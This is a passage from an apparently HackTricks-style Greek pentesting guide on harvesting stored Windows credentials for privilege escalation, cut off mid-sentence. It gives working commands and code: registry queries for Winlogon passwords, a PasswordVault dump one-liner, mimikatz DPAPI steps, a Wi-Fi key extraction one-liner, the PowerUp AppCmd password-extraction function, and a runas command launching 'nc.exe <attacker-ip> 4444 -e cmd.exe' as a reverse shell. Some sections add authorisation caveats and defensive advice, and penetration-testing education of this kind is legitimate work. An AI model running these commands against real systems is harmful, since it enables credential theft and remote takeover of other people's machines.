Το Linux `root` μέσα στο WSL δεν παρέχει από μόνο του δικαιώματα Windows Administrator. Αν η τρέχουσα ταυτότητα Windows μπορεί να διαβάσει το σύστημα αρχείων μιας διανομής, ελέγξτε τα αρχεία ιστορικού κελύφους (συμπεριλαμβανομένου του `/root/.bash_history`) για εντολές που ενδέχεται να έχουν καταγράψει διαπιστευτήρια· για την κλιμάκωση εξακολουθεί να απαιτείται έγκυρος λογαριασμός με υψηλότερα προνόμια και επιτρεπόμενη μέθοδος ελέγχου ταυτότητας. Η διάταξη `LocalState\rootfs` ισχύει για παλαιότερες εγκαταστάσεις WSL· το WSL 2 συνήθως αποθηκεύει τη διανομή σε έναν [εικονικό δίσκο `ext4.vhdx`](https://learn.microsoft.com/en-us/windows/wsl/disk-space), επομένως εντοπίστε πρώτα την πραγματική διανομή και τη διαδρομή αποθήκευσής της. Αποφύγετε την εκτύπωση των περιεχομένων του ιστορικού κατά την αυτοματοποιημένη απαρίθμηση.

## Διαπιστευτήρια Windows

### Διαπιστευτήρια Winlogon

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Αντιμετωπίστε τα `DefaultUserName` και `DefaultDomainName` ως στοιχεία του λογαριασμού, όχι ως διαπιστευτήρια. Μια μη κενή τιμή `DefaultPassword` ή `AltDefaultPassword` αποτελεί εύρημα plaintext στο registry. Αν το `AutoAdminLogon=1`, αλλά δεν είναι αναγνώσιμος κανένας κωδικός πρόσβασης plaintext, αυτό αποτελεί μόνο ένδειξη προς διερεύνηση: το [Sysinternals Autologon μπορεί να αποθηκεύει τον κωδικό πρόσβασης ως LSA secret](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), ενώ οι συνήθεις αναγνώσεις του registry δεν αποδεικνύουν αν υπάρχει αυτό το secret ή αν μπορεί να ανακτηθεί. Ελέγξτε τα δικαιώματα πρόσβασης και την πραγματική διαμόρφωση σύνδεσης προτού αναφέρετε έκθεση διαπιστευτηρίων.

### Διαχειριστής διαπιστευτηρίων / Windows vault

Από το [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Το Windows Vault αποθηκεύει διαπιστευτήρια χρηστών για διακομιστές, ιστοτόπους και άλλα προγράμματα, τα οποία τα **Windows** μπορούν να χρησιμοποιήσουν για να **συνδέουν αυτόματα τους χρήστες**. Αρχικά, μπορεί να ακούγεται σαν να μπορούν οι χρήστες να αποθηκεύουν διαπιστευτήρια για ιστοτόπους όπως το Facebook, το Twitter ή το Gmail και να συνδέονται αυτόματα μέσω των browser, αλλά δεν λειτουργεί έτσι.

Το Windows Vault αποθηκεύει διαπιστευτήρια που μπορούν να χρησιμοποιηθούν από τα Windows για την αυτόματη σύνδεση χρηστών. Αυτό σημαίνει ότι οποιαδήποτε **εφαρμογή Windows που χρειάζεται διαπιστευτήρια για πρόσβαση σε έναν πόρο** (διακομιστή ή ιστότοπο) **μπορεί να χρησιμοποιήσει αυτόν τον Credential Manager** και το Windows Vault και να χρησιμοποιήσει τα παρεχόμενα διαπιστευτήρια, αντί να πληκτρολογούν οι χρήστες το όνομα χρήστη και τον κωδικό πρόσβασης κάθε φορά.

Εκτός αν οι εφαρμογές αλληλεπιδρούν με το Credential Manager, δεν νομίζω ότι μπορούν να χρησιμοποιήσουν τα διαπιστευτήρια για έναν συγκεκριμένο πόρο. Επομένως, αν η εφαρμογή σας θέλει να χρησιμοποιήσει το vault, θα πρέπει με κάποιον τρόπο να **επικοινωνήσει με το Credential Manager και να ζητήσει τα διαπιστευτήρια για αυτόν τον πόρο** από το προεπιλεγμένο vault αποθήκευσης.

Χρησιμοποιήστε το `cmdkey` για να εμφανίσετε τα αποθηκευμένα διαπιστευτήρια στον υπολογιστή.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Στη συνέχεια, μπορείτε να χρησιμοποιήσετε το `runas` με την επιλογή `/savecred` για να χρησιμοποιήσετε τα αποθηκευμένα διαπιστευτήρια. Το παρακάτω παράδειγμα καλεί ένα απομακρυσμένο binary μέσω ενός SMB share.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Χρήση του `runas` με ένα παρεχόμενο σύνολο διαπιστευτηρίων.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Σημειώστε ότι μπορείτε να χρησιμοποιήσετε τα mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) ή το [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Οι σύγχρονες εφαρμογές Windows UWP, το Microsoft Edge και οι σύγχρονες υπηρεσίες συστήματος αποθηκεύουν tokens ελέγχου ταυτότητας και plaintext passwords μέσα στο `PasswordVault` της Universal Windows Platform (UWP) (που εμφανίζεται επίσης ως `Web Credentials` στο `vaultcmd`). Αυτός ο χώρος αποθήκευσης είναι απομονωμένος ανά session και μπορεί να αποκρυπτογραφηθεί εγγενώς, χωρίς δικαιώματα διαχειριστή ή `SeDebugPrivilege`.

Εκτελέστε αυτήν την εντολή PowerShell μέσα στην ενεργή session του χρήστη για να κάνετε αμέσως dump και αποκρυπτογράφηση όλων των αποθηκευμένων usernames και plaintext passwords:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

Το **Data Protection API (DPAPI)** παρέχει μια μέθοδο συμμετρικής κρυπτογράφησης δεδομένων και χρησιμοποιείται κυρίως στο λειτουργικό σύστημα Windows για τη συμμετρική κρυπτογράφηση ασύμμετρων ιδιωτικών κλειδιών. Αυτή η κρυπτογράφηση αξιοποιεί ένα μυστικό χρήστη ή συστήματος, το οποίο συμβάλλει σημαντικά στην εντροπία.

**Το DPAPI επιτρέπει την κρυπτογράφηση κλειδιών μέσω ενός συμμετρικού κλειδιού που παράγεται από τα μυστικά στοιχεία σύνδεσης του χρήστη**. Σε περιπτώσεις κρυπτογράφησης συστήματος, χρησιμοποιεί τα μυστικά στοιχεία ελέγχου ταυτότητας του domain του συστήματος.

Τα κρυπτογραφημένα κλειδιά RSA των χρηστών, με χρήση του DPAPI, αποθηκεύονται στον κατάλογο `%APPDATA%\Microsoft\Protect\{SID}`, όπου το `{SID}` αντιστοιχεί στο [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) του χρήστη. **Το κλειδί DPAPI, το οποίο βρίσκεται μαζί με το κύριο κλειδί που προστατεύει τα ιδιωτικά κλειδιά του χρήστη στο ίδιο αρχείο**, αποτελείται συνήθως από 64 byte τυχαίων δεδομένων. (Σημειώστε ότι η πρόσβαση σε αυτόν τον κατάλογο είναι περιορισμένη, επομένως δεν είναι δυνατή η εμφάνιση των περιεχομένων του με την εντολή `dir` στο CMD, αν και μπορεί να εμφανιστεί μέσω του PowerShell.)

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Μπορείτε να χρησιμοποιήσετε το **mimikatz module** `dpapi::masterkey` με τα κατάλληλα ορίσματα (`/pvk` ή `/rpc`) για να το αποκρυπτογραφήσετε.

Τα **αρχεία διαπιστευτηρίων που προστατεύονται από τον κύριο κωδικό πρόσβασης** βρίσκονται συνήθως στο:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Μπορείτε να χρησιμοποιήσετε το **mimikatz module** `dpapi::cred` με το κατάλληλο `/masterkey` για αποκρυπτογράφηση.\
Μπορείτε να **εξαγάγετε πολλά DPAPI** **masterkeys** από τη **μνήμη** με το module `sekurlsa::dpapi` (αν είστε root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Διαπιστευτήρια PowerShell

Τα **διαπιστευτήρια PowerShell** χρησιμοποιούνται συχνά για εργασίες **scripting** και αυτοματοποίησης, ως ένας βολικός τρόπος αποθήκευσης κρυπτογραφημένων διαπιστευτηρίων. Τα διαπιστευτήρια προστατεύονται με **DPAPI**, κάτι που συνήθως σημαίνει ότι μπορούν να αποκρυπτογραφηθούν μόνο από τον ίδιο χρήστη στον ίδιο υπολογιστή όπου δημιουργήθηκαν.

Ένα εξαγόμενο διαπιστευτήριο μπορεί να έχει αυθαίρετο όνομα αρχείου ή διαδρομή `.xml`. Όταν ένα script ή η απογραφή αρχείων παραπέμπει σε ένα τέτοιο αρχείο, εντοπίστε τον πραγματικό κατάλογο προφίλ του λογαριασμού αντί να υποθέσετε ότι βρίσκεται στο `C:\Users`: [Τα Windows μπορούν να αποθηκεύουν τα προφίλ σε διαφορετική θέση](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Ένα αναγνώσιμο αρχείο είναι απλώς ένα στοιχείο προς διερεύνηση· η [εντολή `Export-Clixml` των Windows συνδέει ένα κρυπτογραφημένο διαπιστευτήριο με τον χρήστη και τον υπολογιστή που το εξήγαγαν](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), και κάθε λογαριασμός που ανακτάται πρέπει ξεχωριστά να διαθέτει έγκυρα δικαιώματα στην υπηρεσία-στόχο. Εξετάστε πρώτα τις διαδρομές και τα ACL, χωρίς να εμφανίζετε κρυπτογραφημένες ή απλού κειμένου τιμές κατά τη συνήθη απογραφή.

Για να **αποκρυπτογραφήσετε** διαπιστευτήρια PS από το αρχείο που τα περιέχει, μπορείτε να κάνετε τα εξής:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wifi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Αποθηκευμένες συνδέσεις RDP

Μπορείτε να τις βρείτε στο `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
και στο `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Εντολές που εκτελέστηκαν πρόσφατα

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Διαχειριστής διαπιστευτηρίων Απομακρυσμένης επιφάνειας εργασίας**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Χρησιμοποιήστε το module `dpapi::rdg` του **Mimikatz** με κατάλληλο `/masterkey` για να **αποκρυπτογραφήσετε τυχόν αρχεία .rdg**\
Μπορείτε να **εξαγάγετε πολλά DPAPI masterkeys** από τη μνήμη με το module `sekurlsa::dpapi` του Mimikatz

**Το mRemoteNG χρησιμοποιεί διαφορετικό χώρο αποθήκευσης συνδέσεων.** Εξετάστε αναγνώσιμο XML στο `%APPDATA%\mRemoteNG` και στους φακέλους Documents των χρηστών, συμπεριλαμβανομένων αρχείων με συνηθισμένα ονόματα όπως `config.xml`. Εντοπίστε το schema των συνδέσεων και τα κρυπτογραφημένα attributes `Password` προτού θεωρήσετε ένα αρχείο XML πιθανό ίχνος credentials. Η αποθηκευμένη τιμή δεν είναι κωδικός πρόσβασης DPAPI/RDCMan· η ανάκτηση εξαρτάται από τις ρυθμίσεις κρυπτογράφησης του αρχείου και από το αν χρησιμοποιήθηκε προσαρμοσμένος master password. Αποφύγετε την εμφάνιση κρυπτογραφημένων τιμών κατά τη μαζική απαρίθμηση.

**Οι εξαγωγές προφίλ του Remote Desktop Plus** μπορεί επίσης να είναι αναγνώσιμες σε καταλόγους χρηστών ή σε κοινόχρηστο φάκελο διαχείρισης. Μια εξαγωγή `profiles.xml` παλαιού τύπου έχει εγγραφές `Data/Profile` με στοιχεία `ProfileName`, `Password` και `Secure`. Αντιμετωπίστε ένα μη κενό στοιχείο κωδικού πρόσβασης ως πιθανό ίχνος credentials, χωρίς να το εμφανίσετε ή να θεωρήσετε ότι είναι απλό κείμενο: [ο προμηθευτής αναφέρει](https://www.donkz.nl/) ότι η προστασία προφίλ μπορεί να συνδέεται με τον λογαριασμό και τον υπολογιστή που το δημιούργησαν ή να έχει ρυθμιστεί με λιγότερο αυστηρό τρόπο. Επιβεβαιώστε την προέλευση του αρχείου και τις προϋποθέσεις ανάκτησης πριν βασιστείτε σε αυτό.

### Sticky Notes

Μερικές φορές οι χρήστες αποθηκεύουν κωδικούς πρόσβασης και άλλες πληροφορίες σε εφαρμογές σημειώσεων. Η συσκευασμένη εφαρμογή Sticky Notes της Microsoft αποθηκεύει συνήθως σημειώσεις στη διαδρομή `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`· παλαιότερες ή διαφορετικές εφαρμογές μπορεί να χρησιμοποιούν άλλους χώρους αποθήκευσης στα προφίλ χρηστών, συμπεριλαμβανομένου του LevelDB. Εντοπίστε την εγκατεστημένη εφαρμογή και τη μορφή αποθήκευσης πριν θεωρήσετε ότι η απουσία αρχείου SQLite σημαίνει ότι δεν υπάρχουν σημειώσεις.

Αν το Sticky Notes χρησιμοποιεί το write-ahead logging του SQLite, ένα αντίγραφο μόνο του `plum.sqlite` μπορεί να μην περιλαμβάνει πρόσφατες δεσμευμένες σημειώσεις. Διατηρήστε το αντίστοιχο `plum.sqlite-wal` μαζί με ένα συνεπές αντίγραφο της βάσης δεδομένων και συμπεριλάβετε το `plum.sqlite-shm` όταν είναι διαθέσιμο· ο δείκτης κοινόχρηστης μνήμης μπορεί να αναδημιουργηθεί, αλλά το WAL αποτελεί μέρος της μόνιμης κατάστασης της βάσης δεδομένων. Δείτε την [τεκμηρίωση του SQLite για το WAL](https://www.sqlite.org/wal.html). Μια σημείωση που περιέχει όνομα λογαριασμού ή κωδικό πρόσβασης αποτελεί μόνο πιθανό ίχνος credentials: επαληθεύστε ξεχωριστά τον λογαριασμό, την επιτρεπόμενη πρόσβαση και την επαναχρησιμοποίηση του κωδικού πρόσβασης. Μια κρυπτογραφημένη εγγραφή password manager απαιτεί επιπλέον το πραγματικό κλειδί αποκρυπτογράφησης και ερμηνεία ειδική για την εφαρμογή, προτού μπορέσει να τεκμηριώσει σύνδεση με υψηλότερα προνόμια.

### AppCmd.exe

**Σημειώστε ότι για την ανάκτηση κωδικών πρόσβασης από το AppCmd.exe πρέπει να είστε Administrator και να εκτελείτε τη διεργασία με επίπεδο High Integrity.**\
Το **AppCmd.exe** βρίσκεται στον κατάλογο `%systemroot%\system32\inetsrv\`.\
Αν υπάρχει αυτό το αρχείο, είναι πιθανό να έχουν ρυθμιστεί ορισμένα **credentials**, τα οποία μπορούν να **ανακτηθούν**.

Αυτός ο κώδικας προέρχεται από το [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Ελέγξτε αν υπάρχει το `C:\Windows\CCM\SCClient.exe` .\
Οι installers **εκτελούνται με προνόμια SYSTEM**, πολλοί είναι ευάλωτοι σε **DLL Sideloading (Πληροφορίες από** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Αρχεία και Registry (διαπιστευτήρια)

### Τεχνουργήματα διαπιστευτηρίων στο Registry εργαλείων υποστήριξης

Ορισμένες παλαιότερες εγκαταστάσεις απομακρυσμένης υποστήριξης διατηρούν ονόματα τιμών που σχετίζονται με κωδικούς πρόσβασης σε σταθερά κλειδιά του Registry της εφαρμογής. Για παράδειγμα, το `SecurityPasswordAES` του TeamViewer προσδιόριζε έναν ρυθμισμένο στατικό κωδικό πρόσβασης συνεδρίας σε εκδόσεις πριν από την 9, σύμφωνα με την [εξήγηση του προμηθευτή για το κλειδί Registry](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988). Ένας δείκτης ονόματος τιμής αποτελεί μόνο αφορμή για έλεγχο: επαληθεύστε την εγκατεστημένη έκδοση, τα αναγνώσιμα δεδομένα της τιμής, τη μορφή και την τρέχουσα συμπεριφορά αυθεντικοποίησης πριν αξιολογήσετε το συγκεκριμένο διαπιστευτήριο. Η μετάβαση από έναν κωδικό πρόσβασης απομακρυσμένης υποστήριξης σε έναν λογαριασμό Windows με υψηλότερα προνόμια απαιτεί επιπλέον πραγματική επαναχρησιμοποίηση του κωδικού πρόσβασης και εξουσιοδότηση για τον συγκεκριμένο λογαριασμό. Μην περιλαμβάνετε ciphertext ή ανακτημένους κωδικούς πρόσβασης σε αποτελέσματα συνήθους απαρίθμησης.

### Κοινόχρηστα υπολογιστικά φύλλα με προστατευμένα φύλλα

Αν υπάρχει υποψία ότι ένα αναγνώσιμο κοινόχρηστο workbook περιέχει δεδομένα λογαριασμών, διακρίνετε την **κρυπτογράφηση αρχείου** από την προστασία φύλλου εργασίας ή τις κρυφές στήλες. Η [Microsoft αναφέρει](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel) ότι η προστασία φύλλου εργασίας ελέγχει την επεξεργασία και δεν αποτελεί λειτουργία ασφαλείας· από μόνη της δεν αποδεικνύει ότι τα περιεχόμενα του workbook είναι κρυπτογραφημένα. Εξετάζετε μόνο σχετικά αρχεία για τα οποία έχετε εξουσιοδότηση και αποφύγετε την εμφάνιση πιθανών μυστικών κατά τη μαζική απαρίθμηση. Μια αναγνώσιμη διαδρομή `.xlsx`, ένα προστατευμένο φύλλο ή μια κρυφή στήλη από μόνα τους δεν αποδεικνύουν ότι υπάρχουν διαπιστευτήρια ή ότι κάποιος λογαριασμός έχει υψηλότερα προνόμια· επαληθεύστε ξεχωριστά τα πραγματικά δεδομένα και τα τρέχοντα δικαιώματα του λογαριασμού.

### Διατηρημένα patches αλλαγών σε CI server

Ένας CI server μπορεί να διατηρεί τις υποβληθείσες αλλαγές πηγαίου κώδικα στον κατάλογο δεδομένων του ακόμη και μετά την ολοκλήρωση του build. Το [TeamCity τεκμηριώνει](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) το `system/changes` ως χώρο αποθήκευσης αλλαγών remote-run· ο κατάλογος δεδομένων μπορεί να έχει ρυθμιστεί και δεν βρίσκεται απαραίτητα κάτω από το `ProgramData`. Ένα αναγνώσιμο patch μπορεί να διατηρεί αναφορές που έχουν αφαιρεθεί ή προστεθεί και αφορούν αρχείο διαπιστευτηρίων, κλειδί κρυπτογράφησης ή script που χρησιμοποιεί και τα δύο. Για παράδειγμα, μια ροή εργασίας PowerShell `ConvertTo-SecureString -Key` χρειάζεται τόσο το AES key όσο και το κρυπτογραφημένο string· η [Microsoft τεκμηριώνει](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) ότι το key παρέχεται ξεχωριστά. Εξετάστε πρώτα μόνο τα προσβάσιμα ονόματα των patches και έπειτα, εφόσον έχετε εξουσιοδότηση, το σχετικό περιεχόμενο, χωρίς να εμφανίζετε μυστικά στα αποτελέσματα συνήθους απαρίθμησης. Μια διαδρομή patch, μια κρυπτογραφημένη τιμή ή μια αναφορά σε key από μόνα τους δεν αποδεικνύουν έγκυρο διαπιστευτήριο ή πρόσβαση με υψηλότερα προνόμια. Περιορίστε τα ACL του καταλόγου δεδομένων και αποφύγετε την υποβολή μυστικών στις αλλαγές του build.

### Προσαρμοσμένη περιστροφή κωδικού πρόσβασης τοπικού διαχειριστή

Ένα αυτοσχέδιο εργαλείο περιστροφής κωδικών πρόσβασης μπορεί να αποθηκεύει έναν κρυπτογραφημένο κωδικό πρόσβασης τοπικού διαχειριστή σε μια τοπική υπηρεσία, διατηρώντας τα διαπιστευτήρια του datastore σε αναγνώσιμο αρχείο `.env` ή δίπλα στο binary του updater. Εξετάστε από κοινού την προγραμματισμένη εργασία του updater, τον λογαριασμό, τα ACL της διαμόρφωσης, τον listener και τα δικαιώματα του datastore. Ένα datastore που ακούει μόνο στο loopback εξακολουθεί να είναι προσβάσιμο από τοπικό χρήστη με έγκυρα διαπιστευτήρια, αλλά η αυθεντικοποίηση από μόνη της δεν αποδεικνύει ότι ο χρήστης έχει δικαίωμα ανάγνωσης των σχετικών εγγραφών. Αν το seed κρυπτογράφησης ή το υλικό του key είναι προσβάσιμο δίπλα στο ciphertext, εξετάστε ακριβώς την παραγωγή του key πριν εμπιστευτείτε την κρυπτογράφηση. Ένα σχήμα που παράγει ντετερμινιστικά ένα AES key από εκτεθειμένο seed χρησιμοποιώντας το Go [`math/rand`](https://pkg.go.dev/math/rand) είναι ακατάλληλο για την προστασία αυτού του κωδικού πρόσβασης· η Go αναφέρει ότι το συγκεκριμένο package δεν είναι κατάλληλο για τυχαιότητα ευαίσθητη ως προς την ασφάλεια. Επιβεβαιώστε ότι τυχόν ανακτημένος κωδικός πρόσβασης είναι έγκυρος και ανήκει σε λογαριασμό της ομάδας local Administrators, πριν τον θεωρήσετε πιθανή διαδρομή κλιμάκωσης προνομίων. Μια προγραμματισμένη εργασία, μια διαδρομή `.env` ή ένα κρυπτογραφημένο blob από μόνα τους δεν αποδεικνύουν καμία από αυτές τις συνθήκες. Μην περιλαμβάνετε κωδικούς πρόσβασης και υλικό key στα αποτελέσματα συνήθους απαρίθμησης.

Χρησιμοποιήστε το [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) για τη διαχείριση κωδικών πρόσβασης τοπικών διαχειριστών. Ο αποθηκευτικός χώρος που υποστηρίζεται από directory ή Entra και τα στοιχεία ελέγχου πρόσβασης διαφέρουν από ένα προσαρμοσμένο τοπικό datastore· αντίστοιχα, οι [ρόλοι Elasticsearch](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) καθορίζουν αν ένας αυθεντικοποιημένος χρήστης datastore μπορεί να διαβάσει συγκεκριμένο index.

### Αρχεία plugin Java server και επαναχρησιμοποίηση διαπιστευτηρίων

Ορισμένα Java server plugins διανέμονται ως αρχεία JAR στον κατάλογο `plugins` ενός server. Ένα αναγνώσιμο προσαρμοσμένο plugin μπορεί να περιέχει διαμόρφωση ή bytecode με ενσωματωμένο διαπιστευτήριο υπηρεσίας. Εξετάζετε το αρχείο μόνο εφόσον έχετε εξουσιοδότηση και μην περιλαμβάνετε ανακτημένα μυστικά στα αποτελέσματα συνήθους απαρίθμησης. Μια διαδρομή plugin από μόνη της δεν αποδεικνύει ότι υπάρχει μυστικό, ενώ ένας ανακτημένος κωδικός πρόσβασης υπηρεσίας οδηγεί σε υψηλότερα προνόμια μόνο αν ισχύει επίσης για λογαριασμό με υψηλότερα προνόμια. Ελέγξτε τα σχετικά ACL αρχείων και αντικαταστήστε τα επαναχρησιμοποιημένα διαπιστευτήρια με ξεχωριστά μυστικά. Δείτε τον [οδηγό εγκατάστασης plugin του PaperMC](https://docs.papermc.io/paper/adding-plugins/) για τη διάταξη των καταλόγων και την [τεκμηρίωση JAR της Oracle](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) για τα περιεχόμενα των αρχείων.

### Διαπιστευτήρια ενσωματωμένης βάσης δεδομένων Openfire

Μια εγκατάσταση Openfire που χρησιμοποιεί την ενσωματωμένη βάση δεδομένων της μπορεί να διατηρεί το `openfire.script` κάτω από το `Openfire\embedded-db`. Αν ο τρέχων λογαριασμός μπορεί να το διαβάσει, εξετάστε μαζί τις εγγραφές `OFUSER` και την ιδιότητα `passwordKey`. Η [τεκμηρίωση παρόχου χρηστών του Openfire](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) αναφέρει ότι οι κωδικοί πρόσβασης μπορούν να αποθηκεύονται ως απλό κείμενο ή κρυπτογραφημένοι με key που βρίσκεται σε αυτή την ιδιότητα. Ένας ανακτημένος κωδικός πρόσβασης έχει σημασία για την κλιμάκωση προνομίων μόνο αν εξακολουθεί να ισχύει για ταυτότητα με υψηλότερα προνόμια· το όνομα αρχείου από μόνο του δεν αποδεικνύει ούτε δικαίωμα ανάγνωσης ούτε επαναχρησιμοποίηση διαπιστευτηρίων. Η διαδρομή αποτελεί ένδειξη για απογραφή, επομένως μην περιλαμβάνετε περιεχόμενο βάσης δεδομένων ή διαπιστευτήρια στα αποτελέσματα συνήθους απαρίθμησης.

Το ξεχωριστό αρχείο `Openfire\conf\openfire.xml` μπορεί να αποκαλύψει τις ρυθμισμένες θύρες και τη διεπαφή bind της κονσόλας διαχείρισης, ακόμη και όταν χρησιμοποιείται εξωτερική βάση δεδομένων. Το Openfire συνήθως κάνει bind την κονσόλα διαχείρισης στο loopback· αυτό εξακολουθεί να επιτρέπει σε έναν τοπικό λογαριασμό να συνδεθεί στη διεύθυνση, αν ο listener εκτελείται. Ελέγξτε από κοινού τον πραγματικό listener, τον εξουσιοδοτημένο ρόλο διαχειριστή, την πολιτική μεταφόρτωσης plugin και την ταυτότητα της υπηρεσίας Openfire. Ένας διαχειριστής που μπορεί να εγκαταστήσει plugin ενδέχεται να προκαλέσει εκτέλεση κώδικα plugin στο πλαίσιο της υπηρεσίας, η οποία μπορεί να έχει υψηλά προνόμια όταν η υπηρεσία εκτελείται ως LocalSystem. Ένας κωδικός πρόσβασης που ταιριάζει ή μια αναγνώσιμη διαδρομή διαμόρφωσης από μόνα τους δεν αποδεικνύουν πρόσβαση στην κονσόλα διαχείρισης ή εκτέλεση 